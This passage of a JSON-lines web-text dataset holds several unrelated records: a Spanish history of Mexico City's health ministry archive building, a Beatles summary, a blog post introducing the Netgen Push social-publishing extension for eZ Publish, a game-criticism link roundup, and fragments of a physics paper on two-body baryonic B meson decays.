lo largo de esta arteria, siendo una de las m\u00e1s importantes de la ciudad virreinal, al estar habitada por personajes importantes de la \u00e9poca.\n\nA finales del siglo XVII, el prefecto Juan Mart\u00ednez de la Parra de la Congregaci\u00f3n del Divino Salvador del Mundo y Buena Muerte -perteneciente a la Compa\u00f1\u00eda de Jes\u00fas de la Orden de los jesuitas-, protegi\u00f3 y mantuvo un hospital para mujeres dementes que adopt\u00f3 el nombre de la Congregaci\u00f3n benefactora, anteriormente esta comunidad de mujeres estaba bajo la protecci\u00f3n del carpintero Jos\u00e9 S\u00e1yago, apoyado por el Arzobispo Francisco de Aguiar y Seijas y estuvo situado por las calles de lo que hoy es Jes\u00fas Mar\u00eda.\n\nHacia 1699, la Congregaci\u00f3n del Divino Salvador adquiri\u00f3 en la entonces calle de la Canoa (hoy Donceles) un edificio grande pero ruinoso, con la intenci\u00f3n de establecer el Hospital para Mujeres Dementes. Un a\u00f1o despu\u00e9s fueron instaladas las asiladas a pesar de que las obras de construcci\u00f3n no hab\u00edan terminado.\n\nDurante los siglos XVIII y XIX, el Hospital del Divino Salvador siempre estuvo sujeto a una penuria de recursos y prestaba sus servicios a pesar de estar en un estado ruinoso, durante su existencia experiment\u00f3 diversas reparaciones y remodelaciones conforme avanzaban los conocimientos m\u00e9dicos de la \u00e9poca para mejorar la atenci\u00f3n de las enfermas, hasta que dej\u00f3 de funcionar en 1910, pues las pacientes fueron trasladadas al Manicomio General ubicado en la ExHacienda de la Casta\u00f1eda; para esas fechas el edificio estaba bastante deteriorado, debido a su uso como Cuartel del Segundo Regimiento de Caballer\u00eda durante los a\u00f1os de la Revoluci\u00f3n, raz\u00f3n por la cual, el Presidente Venustiano Carranza instruy\u00f3 su demolici\u00f3n (rescat\u00e1ndose s\u00f3lo un 20% del original) para edificar el actual, construido exprofeso para albergar las oficinas de la Beneficencia P\u00fablica.\n\nEn un principio la obra estuvo bajo el cuidado del arquitecto Luis Mac Gregor, quien renunci\u00f3 a los pocos meses, quedando los trabajos de manera provisional a cargo del arquitecto Gonzalo Montero de Collado, jefe del departamento de edificios de la Secretaria de Comunicaciones. Los trabajos pasaron de manera definitiva a manos del ingeniero Manuel de la Sota Riba.\nLa nueva construcci\u00f3n es de mamposter\u00eda de piedra, lo mismo que la cimentaci\u00f3n; los techos son b\u00f3veda de ladrillo sobre viguetas de acero. Consta de planta baja y planta alta con tres grandes patios, habi\u00e9ndose empleado para la distribuci\u00f3n el sistema de dobles cruj\u00edas, tanto en la fachada como entre estos \u00faltimos.\nAunque se tiene referencia de que el edificio comenz\u00f3 a ocuparse desde 1922 fue hasta el 21 de febrero de 1927 que se inaugur\u00f3 por parte del entonces Presidente de la Rep\u00fablica Plutarco El\u00edas Calles, para albergar las oficinas de la beneficencia p\u00fablica. El costo del inmueble fue de aproximadamente de 950,000 pesos.\n\nEl 19 de diciembre de 1932 el edificio fue declarado monumento hist\u00f3rico por la entonces Direcci\u00f3n de Monumentos Coloniales y de la Rep\u00fablica del Instituto Nacional de Antropolog\u00eda e Historia.\n\nEl 1 de enero de 1938 el edificio de Donceles No. 39 fue sede de la Secretaria de la Asistencia P\u00fablica y al fusionarse con el Departamento de Salud P\u00fablica, por acuerdo Presidencial del 15 de octubre de 1943 se cre\u00f3 la Secretaria de Salubridad y Asistencia que despacho durante dos meses en el edificio, antes de mudarse a sus nuevas instalaciones ubicadas en la calle de Lieja No7. Posteriormente el inmueble se convirti\u00f2 en recinto de diversas oficinas de la misma Secretaria, tales como:\n Direcci\u00f3n General de Higiene y Asistencia en el D.F.\n Direcci\u00f3n de Salubridad en el D.F.\n Direcci\u00f3n General de Asistencia M\u00e9dica.\n Direcci\u00f3n de Asistencia Social en el D,F.\n Direcci\u00f3n General de Asistencia Materna Infantil\n Direcci\u00f3n General de Rehabilitaci\u00f3n.\n Direcci\u00f3n General de Regulaci\u00f3n Sanitaria de Productos y Servicios.\n\nHa sido residencia del Archivo Hist\u00f3rico a partir de 1945.\n\nObjetivos \n\n Organizar el patrimonio hist\u00f3rico documental producido y utilizado por la instituci\u00f3n.\n Resguardar y conservar los archivos con valores permanentes.\n Fomentar la consulta y la investigaci\u00f3n hist\u00f3rica mediante la difusi\u00f3n de su acervo.\n\nFondos documentales \nEl acervo del AHSSA est\u00e1 constituido por 16 fondos documentales, reunidos en tres grandes grupos:\n\n Fondos Eclesi\u00e1sticos\n Fondos de Instituciones Gubernamentales de Salud o Asistencia\n Fondos de Establecimientos Hospitalarios y Asistenciales, que en conjunto contienen informaci\u00f3n generada desde 1561 hasta la actualidad\n\nFondos Eclesi\u00e1sticos:\n Congregaci\u00f3n de San Pedro (1561-1861): fue una asociaci\u00f3n de sacerdotes instituida en el siglo XVI, con el prop\u00f3sito de impartir asistencia espiritual y corporal a sus integrantes.\n\n Convento de Jes\u00fas Mar\u00eda (1577-1859): fue un convento de monjas de la regla concepcionista, fundado en el siglo XVI para que ingresaran a la vida religiosa las descendientes pobres de los primeros conquistadores hispanos.\n\n Cofrad\u00edas (1595-1860): eran organizaciones de fieles, con prop\u00f3sitos religiosos, como ejercitarse en obras de caridad o rendir culto a alg\u00fan santo.

Comprising John Lennon, Paul McCartney, George Harrison and Ringo Starr, the group shattered many sales records and charted more than fifty top 40 hit singles. They were the first British pop act to achieve major and ongoing success in the United States, scoring twenty #1 hits in the USA alone, becoming the biggest musical act of the twentieth century. EMI estimated in 1985 that the band had sold over a billion records worldwide[1]. Their ballad \"Yesterday\" \u2014 written and sung by Paul McCartney (though officially credited as written by Lennon-McCartney) \u2014 is the most-covered song in the history of recorded music(about 2500 versions of it exist).\nTheir earliest compositions were mainly rock 'n' roll or R&B-rooted pop songs with the occasional ballad. But they grew increasingly eclectic as composers, arrangers and performers over the years. They composed songs and arranged them in a wide array of musical styles \u2013 occasionally fusing genres. The constant factor in the vast majority of their songs was their focus on melody. Despite the wide array of musical styles utilized, Beatles recordings were readily identifiable because of their distinctive vocals. In addition to their core pop and rock styles, The Beatles canon included songs flavored with folk, country, rockabilly, blues, soul, doo-wop, ska and many other musical genres. They were also pioneers of new musical directions such as psychedelia (with \"Strawberry Fields Forever\") and early heavy metal (with \"Helter Skelter\"). Their use of George Martin's chamber and baroque orchestrations on songs such as \"Yesterday\" and \"Eleanor Rigby\" was another first in contemporary popular music.\nThey also pioneered many innovative production techniques and their epoch-making 1967 LP Sgt. Pepper's Lonely Hearts Club Band is often cited as one of the first concept albums. Their clothes, hairstyles and choice of musical instruments made them trendsetters throughout the decade; their growing social awareness, reflected in the development of their music, saw their influence extended far beyond the music scene into the social and cultural revolutions of the 1960s; and their enduring popularity with successive generations of both fans and musicians has cemented their reputation for being one of the most influential music artists of all time. The group disbanded in 1970 amid much strife. Thirty-five years later, in 2005, the American entertainment industry magazine Variety named them the most iconic entertainers of the 20th century\nlist of beatle's songs\nhttp://en.wikipedia.org/wiki/The_Beatles", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 34580}
{"text": "We at Netgen just released our brand new extension called Netgen Push.\nMain reasoning behind this extension was to provide a simple and unified experience for all of our clients, requiring only the creation of Twitter accounts and Facebook pages for their brands.\nBasic installation of Netgen Push extension is pretty straightforward, requiring standard steps needed to install the extension to your eZ Publish instance (unpacking the extension, activating it in settings, regenerating autoload array and clearing caches).\nPrerequisites for using Netgen Push, besides already mentioned Facebook and Twitter accounts to which you wish to push content, include creating of Bit.ly account for URL shortening and Facebook and Twitter applications which will handle content publishing.\nNetgen provides Twitter and Facebook applications called \"Netgen Push\" and Bit.ly account to be used instantly. We do keep the right to disable usage of those applications for anyone who misuses them. It is also possible to use your own Facebook and Twitter applications and Bit.ly account. More info about creating your own apps will be covered in a future post, so stay tuned.\nMost of the configuration is done through ngpush.ini configuration file.\nSiteURL \u2013 represents the URL to your site so you can freely define what will be prepended to URL alias of objects that you push.\nConnectURL \u2013 this setting is a callback URL for Twitter and Facebook applications that gets called after authorization and serves only as a redirect back to the administration interface of your eZ Publish instance. You don't need to change this setting if you wish to use apps provided by Netgen.\nBlocks and ActiveBlocks settings define which connectors Netgen Push uses. ActiveBlocks is an array that defines which connectors will be expanded by default in the administration interface.\nNetgen Push uses Bit.ly service to shorten the URLs to your content, so the user login and Bit.ly API key need to be defined in the [bitly] settings block. As with ConnectURL, these settings are also preconfigured for you with Netgen Push Bit.ly account.\nSettings related to Twitter and Facebook connectors are defined in [twitter] and [facebook] settings blocks and include name displayed in the administration, type, API keys and secrets used for accessing Twitter and Facebook applications, as well as mapping arrays to allow different classes to have different attributes mapped to the supported fields. [facebook] Id setting must be set to the ID of your Facebook page.\nIf you wish to use your own Facebook and Twitter applications and not those provided by Netgen, extension requires two files (redirect.php and .htaccess, available in \"share/connect_server\" folder of the extension) to be placed to a publicly accessible web server. This allows Twitter and Facebook to transfer the result of authorization process back to you. redirect.php script, upon receiving the answer from Facebook or Twitter, simply redirects the answer to your eZ Publish instance in order to save the tokens.\nWe, for example, keep those two files on our own subdomain push.netgen.hr (ConnectURL in ngpush.ini). Every client, when requesting auth tokens, first gets redirected there, and then back to it's administration interface.\nNetgen Push can be called in two ways through the eZ Publish administration interface. First one is by using the standard popup menu, available when clicking on the node icon in content tree. The second one is by using the provided workflow event that can be attached to after publish trigger. The event simply redirects the user to Netgen Push after publishing process is complete.\nAttached below is a screenshot of Netgen Push extension in action.\nAs you can see, Netgen Push allows you to edit the content before pushing to social networks. Markup in XML fields will be automatically stripped and paragraph blocks will be preserved. You can push to each service separately, or you can push to all services at once. We also plan to implement automatic content pushing to configured services after publishing an object.\nNetgen Push can be downloaded from http://projects.ez.no/ngpush and used freely as it is published under GNU GPLv2 license.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 88624}

{"text": "by Katie Williams\nWhoa, but that's a lot of words! Our Critical Distance update is full of good stuff today, people, so let's get right into it.\nFirstly, The Mary Sue's Becky Chambers discusses what she dubs the 'Hey Sweetheart Scenario', using Dragon Age as an example of a game whose NPCs treat a female player character as something to be taken aback by. Says Chambers,\nIf you, as a game writer, are tasked with creating a story in which the player feels like a bonafide hero, then what purpose does it serve to point out that my heroine is going to have to work twice as hard to be taken seriously, purely because of her gender? That's a feeling I already have in the real world, and it's not one that I want to experience within a game. If you've actually got something to say about gender norms within the narrative of a game, then say it. Tacking it on just because it's what you're used to takes away from the integrity of the story and kicks female players right back to an uncomfortable reality.\nIn contrast to this, Ben Chapman at the Pixels or Death blog has some fascinating insight into gender in the world of Mass Effect in his piece 'Dispatches From the Villain, Fem Shep'. While he admits that he plays his male Shepard as a hero and his female Shepard as a borderline sociopath, he is amazed that his own \"accidental misogyny\" is not supported by the game world: \"\u2026 scarcely anyone calls my Fem Shep 'a bitch'. There are virtually no derogatory remarks belittling my capability to fight on account of my virtual boobs. No one makes a sarcastic remark about \"my gender\" and driving ability when I accidentally ramp the M35 Mako upside down into a crater.\"\nAt Nightmare Mode, Mattie Brice frankly shares her experience of growing into a transgender identity through the lens of Katawa Shoujo's Hanako. Brice says, \"I saw her do something that triggered a muscle memory from my past: She covers her face.\"\nPaul Tassi, contributing to Forbes, has some things to say about piracy and the entertainment industry in his article 'Lies, Damned Lies and Piracy':\nI would argue that releasing crappy movies has a far greater effect on the film industry bottom line than piracy ever could. Similar things happen when a hyped TV show bombs or an anticipated game is a letdown. Companies don't rise and fall due to piracy, but they do based on the quality of the products they release.\nThe point I'm trying to make is that piracy is not this mammoth specter killing the entire entertainment industry like they would have you believe. I am not saying that there has never been a dollar or job lost because of it, nor am I encouraging the illegal practice in the least, but the natural ebbs and flows of the industry with big hits and misses are far more significant than miniscule piracy loses among a specific, young, tech-savvy group who knows how to get their media for free.\nOver at VG 24/7, Patrick Garratt tours Finland, with some excellent and quality reporting on what he learns of the Finnish development scene.\nThe Border House has picked up an intelligent analysis of 'Analogue: A Hate Story' by our own lead curator Kris Ligman, in which she touches upon topics such as games-as-fun, its modelling on Korean history, and its relation to the Star Trek series.\nAdditionally, Critical Distance contributor Eric Swain is at it again with an examination of Driver: San Francisco, this time looking at it alongside the movie Drive. Most memorable is his comparison of how the two works are firmly anchored in the act of driving:\nRyan Gosling's character is solely defined as a person by his most potent ability: driving. He has no name, no past, and all the human contact that he has is filtered through driving. The dates that he goes out on? They're night drives. The business ventures that serve as his main means of human contact? They are his job at a garage and stock car racing. He meets his \"love interest\" by helping her with her car. In an action video game, the protagonist is solely defined by the verb that the player uses to interact with the game. In the case of Driver: San Francisco and John Tanner, that verb is \"drive.\"\nAt Kotaku, Kate Cox looks at the David Jaffe's blundering self-promotion of his newest game, Twisted Metal, asking us: 'Does David Jaffe Really Recommend His New Game As A Sexual Aid?' Says Cox,\nThe part that Jaffe seems to misunderstand is that someone doesn't need to be waxing a handlebar moustache and tying young ladies to railroad tracks to make a sexist or misogynist statement. Most trouble doesn't actually come from villains and it doesn't come from people who actively stand around shouting, \"I hate women.\" It comes from thoughtlessness.\nBy framing his statement as \"let her win and she'll give you a blowjob,\" Jaffe's said a few things he may or may not have meant to. The first is that only straight men could possibly develop an independent interest in playing his game. The second is that the best way for a man to get what he wants is to come up with some underhanded trickery to apply. The last is that a girl or woman couldn't actually win a co-op match on her own.\nPatricia Hernandez also made a splash at Kotaku this week with an epic-length piece called 'The Rules of Religion, And Why The Next One Might Just Be A Game'. She looks at a handful of games as well as the possible gamification of religion, but most striking to me, personally, was her retelling of his own family's attitudes towards religion, as well as the sweetly self-aware acknowledgement of her Kotaku debut. It's a long piece, but fully worth it when you reach the final few paragraphs.\nOver at Gameranx, Brendan Keogh doesn't believe that Skyrim is cold:\nI was told that Skyrim was a harsh, desolate region, whose terrifying weather chiseled the toughest men and women in all of Tamriel. But then I walk its mountains and cities and I see adults and children alike strolling through a blizzard in sleeveless attire, not even flinching. My character swims in arctic conditions and doesn't even gasp. I've come across bandit camps that are bedrolls completely exposed to the elements beside a campfire that couldn't possibly be burning without an unhealthy dose of napalm. There is a whole heap of snow in Skyrim but there is no cold.\nAlso at Gameranx, John Vanderhoef looks at the trope of the male main character and his female companion in 'The Princess and the Knight: Companion Games and Missed Opportunities'.\nThere's something about L.A. Noire that lends itself to incredibly intricate and pensive writing, and Daniel Golding's post on it at his Crikey blog Game On is no exception. Though Golding calls it a \"review\" and admits that it's only eight months late, to him, this \"slowness\" becomes an integral part of the game itself:\nReviewing a videogame within a week of its release can force you to overlook its subtleties and emphasise aspects that, with time, reveal themselves as far more important than apparent at first blush. Yet leave it too long and you risk falling into the cracks, the familiarity of a videogame massaging over the faults. Each game may have a rhythm, but so does every player, critics included. I am stuck in the spaces between L.A. Noire's four-note musical motif.\nBut by now, I know L.A. Noire, and I know that it's worth playing, worth watching, and worth spending time with. It's worth thinking about. It's worth contemplating.\nAnd finally, the hot issue of the week was studio Double Fine's Kickstarter venture to fund a new point-and-click adventure game, which at the time of writing has raised $1,659,095 of its $400,000 goal. No, really.\nCraig Wilson of Split Screen presents 'A Double Fine Audit', speculating what say fans will have in the development of a game they funded. Wilson writes,\nWhat alarmed me was how willingly people donated given how little details had been made available. Sure there's the usual tiered list of donation gifts and a funny video but Double Fine promise involvement in the development process. But outside of the documentary what does that mean? What does my money actually buy me? To what extent, as a financial stakeholder, am I actively involved?\nOn the other hand, Seb Wuepper at Gameranx asks passionately, 'Are You People Insane?' Addressing the controversy around Double Fine's crowdfunding, he says,\nThis seems like another case of gamer entitlement. The reasons escape me, since the downsides of this approach to funding seem minimal at best. If the worst happens, gamers are out by a mere $15 at the least. Which at this point seems highly unlikely since the project is already funded with more than a month to go. Make no mistake, this is not a risky investment. It's a\u2014for the lack of a better term\u2014preorder for a highly passionate company producing what's seen as a niche product.\nFinally, Rowan Kaiser sits between the two as he writes 'Double Fine's Kickstarter Effect: What Happens Next?'

{"text": "\\section{Introduction}\nFor the abundantly observed three-body baryonic $B$ decays ($B\\to {\\bf B\\bar B'}M$),\nthe theoretical approach for the systematic study has been\nestablished~\\cite{HouSoni,Cheng:2001tr,ChuaHou,ChuaHouTsai,AngdisppK,NF_GengHsiao}.\nIt leads to the theoretical predictions, among which at least five decay modes~\\cite{GengHsiao5,GengHsiaoHY}\nare observed to agree with the data~\\cite{pdg}.\nOn the other hand,  the two-body baryonic $B$ decays ($B\\to {\\bf B\\bar B'}$) are poorly understood\ndue to the smaller branching ratios, causing a much later observation than $B\\to {\\bf B\\bar B'}M$.\nRecently, the LHCb collaboration has presented the first observations of the charmless\n$B\\to {\\bf B\\bar B'}$ decays~\\cite{Aaij:2013fta},  given by\n\\begin{eqnarray}\\label{data1}\n{\\cal B}(\\bar B^0\\to p\\bar p)&=&(1.47^{+0.62+0.35}_{-0.51-0.14})\\times 10^{-8}\\,,\\nonumber\\\\\n{\\cal B}(\\bar B^0_s\\to p\\bar p)&=&(2.84^{+2.03+0.85}_{-1.68-0.18})\\times 10^{-8}\\,\n\\end{eqnarray}\nwith the statistical significances to be $3.3\\sigma$ and $1.9\\sigma$, respectively.\n\nBased on the factorization,\nwhen the $B$ meson annihilates with the momentum transfer $q$,\nthe amplitudes ${\\cal A}(\\bar B^0_{(s)}\\to p\\bar p)$ can be decomposed as\n$q^\\mu\\langle p\\bar p|A_\\mu|0\\rangle$, where the matrix element is for\nthe proton pair production and $A_\\mu$ is the axial-vector current.\n From the hypothesis of the partial conservation of the axial-vector\n current (PCAC)~\\cite{PCAC} at the GeV scale,\n $q^\\mu A_\\mu$ is proportional to $m_\\pi^2$,\nwhich leads to ${\\cal A}(\\bar B^0_{(s)}\\to p\\bar p)\\simeq 0$.\nThis is the reason why the non-factorizable\neffects were believed to dominate the branching ratios\nin Eq.~(\\ref{data1})~\\cite{diagramic1}\\footnote{For the review of the various models, please consult Ref.~\\cite{diagramic1},\nand the references therein.}.\nHowever, since the predictions from these models differ from each other, and commonly exceed\nthe data, a reliable theoretical approach has not been established yet.\n\nIn this work, we would propose a new method without the use of PCAC. In fact, the smallness\nof the previous estimations is not caused by the annihilation mechanism~\\cite{Pham:1980dc},\nbut the assumption of PCAC. Moreover, this assumption has never been tested  at the GeV scale.\nFor example, ${\\cal B}(B^-\\to\\Lambda\\bar p)$ and ${\\cal B}(\\bar B^0_s\\to\\Lambda\\bar \\Lambda)$\nare found to have the amplitudes decomposed as\n$({m_B^2}/{m_b}) \\langle p\\bar p|S+P|0\\rangle$ with $S(P)$ the (pseudo)scalar current,\nwhich has no connection to PCAC. Since they can be estimated to be of order $10^{-8}$,\nexactly the order of the magnitude of ${\\cal B}(B\\to{\\bf B\\bar B'})$ measured by the experiments,\nthe annihilation mechanism can be justified.\nIf the axial-vector current is asymptotically conserved,\nthe result of ${\\cal B}(D_s^+\\to p\\bar n)=(0.4^{+1.1}_{-0.3})\\times 10^{-6}$ in Ref.~\\cite{Chen:2008pf}\nwould yield ${\\cal B}(D_s^+\\to p\\bar n)/{\\cal B}(D_s^+\\to \\tau\\bar \\nu_\\tau)\\simeq 10^{-5}$,\nwhich was indeed suggested as the test of PCAC at the GeV scale~\\cite{Pham:1980dc}.\nNonetheless, with\n${\\cal B}(D_s^+\\to p\\bar n)$$=(1.30\\pm 0.36^{+0.12}_{-0.16})\\times 10^{-3}$ measured\nby the CLEO Collaboration~\\cite{Athar:2008ug},\none obtains that ${\\cal B}(D_s^+\\to p\\bar n)/{\\cal B}(D_s^+\\to \\tau\\bar \\nu_\\tau)\\simeq 0.02$,\nwhich is too large and can be viewed as\na counter case of PCAC~\\cite{Bediaga:1991eu}.\n\nIn this paper,\nwe apply the annihilation mechanism  to the two-body baryonic $B$ decays,\nprovided that the axial-vector current is not asymptotically conserved.\nBy modifying the timelike baryonic form factors via the axial-vector current without respect to PCAC,\nwe can explain ${\\cal B}(\\bar B^0_{(s)}\\to p\\bar p)$ as well as ${\\cal B}(D_s^+\\to p\\bar n)$.\nWe shall also predict\n${\\cal B}(B^-\\to\\Lambda(\\Sigma^0)\\bar p)$ and ${\\cal B}(\\bar B^0_s\\to\\Lambda\\bar \\Lambda)$\nin terms of the timelike baryonic form factors via the scalar and pseudoscalar currents.\n\nThe paper is organized as follows. In Sec.~2, we present the formalism of  the two-body baryonic $B$ and $D_s$ decays.\nIn Sec.~3, we  proceed  our numerical analysis.\n  Sec.~4 contains our discussions and conclusions.\n\n\\section{Formalism}\n\\begin{figure}[t!]\n\\centering\n\\includegraphics[width=2.0in]{2b_B0topp.eps}\n\\includegraphics[width=2.0in]{2b_Bstopp.eps}\n\\includegraphics[width=2.0in]{2b_Dstopn.eps}\n\\caption{The

factorization hypothesis\nare in analogy with the semileptonic cases like\n${\\cal A}(B\\to \\pi e\\bar \\nu_e)\\propto\n\\langle \\pi|u\\gamma^\\mu(1-\\gamma_5)b|B\\rangle \\bar

$J^{1,2}_{(\\mu)}$ are the quark currents, and\n$X_{1,2}$ can be multi-hadron states~\\cite{fac1,fac2}.\nAlthough the derivation may not be analytically satisfactory,\nthe factorization approximation can still be justified\nby theoretically reproducing the data and predicting not-yet-observed decay modes\nto be approved by the later measurements\nin the two-body and three-body mesonic $B$ decays\nas well as the three-body baryonic $B$ decays~\\cite{GengHsiaoHY,ali,Hamiltonian,3b_HY}.\n\n\nLike the measured $\\bar B^0_{(s)}\\to p\\bar p$ and $D_s^+\\to p\\bar n$\nwith the decaying processes depicted in Fig.~\\ref{figBtoBB},\nin the two-body baryonic $B$ and $D_s$ decays,\nthe factorizable amplitudes are known to depend on\nthe annihilation mechanism~\\cite{Pham:1980dc,Bediaga:1991eu},\nwhere $B$ and $D_s$ annihilate, followed by the baryon pair production.\nThus, the amplitudes can have two types, ${\\cal A}_1$ and ${\\cal A}_2$,\nwhich consist of (axial)vectors and (pseudo)scalar quark currents, respectively.\nFor example, the amplitudes of $\\bar B^0\\to (p\\bar p$, $\\Lambda\\bar \\Lambda)$,\n$B^-\\to (n\\bar p$, $\\Sigma^-\\bar \\Sigma^0)$,\nand $D_s^+\\to p\\bar n$ are of the first type,\ngiven by~\\cite{Pham:1980dc,Bediaga:1991eu,Chen:2008pf}\n\\begin{eqnarray}\\label{amp1}\n&&{\\cal A}_1(\\bar B^0\\to {\\bf B_1\\bar

For the coefficients $a_i$ in Eqs.~(\\ref{amp1})-(\\ref{amp2}),\nwe use the same inputs as those in $B\\to{\\bf B\\bar B'}M$~\\cite{GengHsiao5,GengHsiaoHY},\nwhere $a_i=c^{eff}_i+c^{eff}_{i\\pm1}/N_c$\nwith the color number $N_c$ for $i=$odd (even) in terms of the effective Wilson coefficients $c^{eff}_i$,\ndefined in Refs.~\\cite{Hamiltonian,ali}.\nNote that $N_c$ is floating between 2 and $\\infty$ in the generalized factorization\nfor the correction of the non-factorizable effects. In Eqs.~(\\ref{amp1a})-(\\ref{amp2}),\nthe matrix element for the annihilation of the pseudoscalar meson is defined by\n\\begin{eqnarray}\n\\label{decayconst}\n\\langle 0|\\bar q_1 \\gamma_\\mu \\gamma_5 q_2| P\\rangle&=&if_P q_\\mu\\,,\n\\end{eqnarray}\nwith $f_P$ the decay constant, from which\nwe can obtain $\\langle 0|\\bar q_1 \\gamma_5 q_2| P\\rangle$ by using\nthe the equation of motion:\n$-i\\partial^\\mu(\\bar q_1\\gamma_\\mu q_2)=(m_{q_1}-m_{q_2})\\bar q_1 q_2$ and\n$-i\\partial^\\mu(\\bar q_1\\gamma_\\mu\\gamma_5 q_2)=(m_{q_1}+m_{q_2})\\bar q_1\\gamma_5 q_2$.\nFor the dibaryon production, the matrix elements read\n\\begin{eqnarray}\\label{timelikeF}\n\\langle {\\bf B}{\\bf\\bar B'}|\\bar q_1\\gamma_\\mu q_2|0\\rangle\n&=&\\bar u\\bigg\\{F_1\\gamma_\\mu+\\frac{F_2}{m_{\\bf B}+m_{\\bf \\bar B'}}i\\sigma_{\\mu\\nu}q_\\mu\\bigg\\}v\\;,\\nonumber\\\\\n\\langle {\\bf B}{\\bf\\bar B'}|\\bar q_1\\gamma_\\mu \\gamma_5 q_2|0\\rangle\n&=&\\bar u\\bigg\\{g_A\\gamma_\\mu+\\frac{h_A}{m_{\\bf B}+m_{\\bf \\bar B'}}q_\\mu\\bigg\\}\\gamma_5 v\\,,\\nonumber\\\\\n\\langle {\\bf B}{\\bf\\bar B'}|\\bar q_1 q_2|0\\rangle &=&f_S\\bar u v\\;,\\nonumber\\\\\n\\langle {\\bf B}{\\bf\\bar B'}|\\bar q_1\\gamma_5 q_2|0\\rangle &=&g_P\\bar u\\gamma_5 v\\,,\n\\end{eqnarray}\nwith $u$($v$) is the (anti-)baryon spinor, where $F_{1,2}$,\n$g_A$, $h_A$, $f_S$, and $g_P$ are the timelike baryonic form factors.\nThe amplitudes ${\\cal A}_1$ and ${\\cal A}_2$ now can be reduced as\n\\begin{eqnarray}\\label{A1A2}\n&&{\\cal A}_1\\propto\n\\frac{1}{(m_{\\bf B}+m_{\\bf\\bar B'})}\\;\\bar u\\bigg[(m_{\\bf B}+m_{\\bf\\bar B'})^2 g_A\n+m_{B(D_s)}^2 h_A\\bigg]\\gamma_5 v\n\\,,\\nonumber\\\\\n&&{\\cal A}_2\\propto \\frac{m_B^2}{m_b}\\;\\bar u (f_S +g_P \\gamma_5)v\\,.\n\\end{eqnarray}\nNote that  $f_S$ and $g_P$ are not suppressed by any relations, such that\nthe factorization obviously works for the decay modes with ${\\cal A}_2$.\nBesides, the absence of $F_{1,2}$ in ${\\cal A}_1$ corresponds to the conserved vector current (CVC).\nHowever,  due to the equation of motion $F_1$ reappears as a part of $f_S$ in ${\\cal A}_2$, given by\n\\begin{eqnarray}\nf_S=n_q F_1\\,,\n\\end{eqnarray}\nwith $n_q=(m_{\\bf B}-m_{\\bf B'})/(m_{q_1}-m_{q_2})$,\nwhich is fixed to be 1.3~\\cite{ChuaHouTsai,GengHsiao5},\npresenting $30\\%$ of the $SU(3)$ flavor symmetry breaking effect.\nIn pQCD counting rules, the momentum dependences of $F_1$ and $g_A$\ncan be written as \\cite{Brodsky1,Brodsky2,Brodsky3}\n\\begin{eqnarray}\\label{timelikeF2}\n&&F_1=\\frac{C_{F_1}}{t^2}\\bigg[\\text{ln}\\bigg(\\frac{t}{\\Lambda_0^2}\\bigg)\\bigg]^{-\\gamma}\\;,\n\\qquad g_A=\\frac{C_{g_A}}{t^2}\\bigg[\\text{ln}\\bigg(\\frac{t}{\\Lambda_0^2}\\bigg)\\bigg]^{-\\gamma}\\;,\n\\end{eqnarray}\nwith $t\\equiv (p_{\\bf B}+p_{\\bf B'})^2$, where $\\gamma=2+4/(3\\beta)=2.148$\nwith $\\beta$ being the QCD $\\beta$ function and $\\Lambda_0=0.3$ GeV.\nWe note that, as the leading order expansion, $F_1$ and $g_A$ ($\\propto 1/t^2$) account for 2\nhard gluons, which connect to the valence quarks within the dibaryon.\nIn terms of \nPCAC, one obtains the relations of\n\\begin{eqnarray}\\label{hAf}\nh_A=-\\frac{(m_{\\bf B}+m_{\\bf B'})^2}{t-m_{M}^2}g_A\\,,\\qquad\ng_P=-\\frac{m_{\\bf B}+m_{\\bf B'}}{m_{q_1}+m_{q_2}}\\frac{m_M^2}{t-m_{M}^2}g_A\\,,\n\\end{eqnarray}\nwhere $m_{M}$ stands for the meson pole, while $g_P$ is related to $g_A$\n from the equation of motion.\nWhen  $h_A$ in Eq.~(\\ref{hAf}) is used for $B\\to {\\bf B\\bar B'}$ with $t=m_B^2\\gg m_M^2$,\n${\\cal B}(\\bar B^0_{(s)}\\to p\\bar p)$ with a suppressed $A_1\\simeq 0$\nfails to explain the data by several orders of magnitude.\nSimilarly, ${\\cal B}(\\bar B^0\\to \\Lambda\\bar p\\pi^+(\\rho^+))$ cannot be understood either\nwith $g_P$ in Eq.~(\\ref{hAf})~\\cite{Cheng:2001tr,ChuaHouTsai}.\nWe hence conclude  that\n $h_A$ and $g_P$ in Eq.~(\\ref{hAf}) from PCAC at the GeV scale\n\nare unsuitable. Recall that $F_1$ and $g_A$,\nwhere $F_1=F_1(0)/(1-t/m_V^2)^2$ and $g_A=g_A(0)/(1-t/m_A^2)^2$~\\cite{F1gA}\nwith the pole effects for low momentum transfer,\nhave been replaced by Eq.~(\\ref{timelikeF2}) for the decays at the GeV scale.\nIt is reasonable to rewrite $h_A$ and $g_P$ to be\n\\begin{eqnarray}\\label{hAn}\nh_A=\\frac{C_{h_A}}{t^2}\\,,\\qquad g_P=f_S\\,,\n\\end{eqnarray}\nwhere $h_A$ is inspired by the  relation in Eq.~(\\ref{hAf}).\nFor  $h_A$ in Eq.~(\\ref{hAf}),\nsince the pre-factor, $-(m_{\\bf B}+m_{\\bf B'})^2/t$, arises from the equation of motion,\nit indicates that both $h_A$ and $g_A$ behave as $1/t^2$.

